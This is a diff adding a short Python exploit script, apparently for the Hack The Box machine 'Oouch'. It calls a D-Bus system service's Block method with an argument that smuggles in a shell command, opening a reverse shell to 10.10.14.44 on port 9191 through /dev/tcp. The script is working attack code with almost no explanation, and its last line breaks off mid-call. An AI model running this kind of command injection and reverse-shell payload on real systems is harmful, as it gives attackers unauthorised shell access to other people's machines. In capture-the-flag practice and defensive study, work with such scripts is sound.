@@ -1,0 +1,7 @@
+import dbus
+bus = dbus.SystemBus()
+block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
+response = block_iface.Block(runme)
+bus.close(
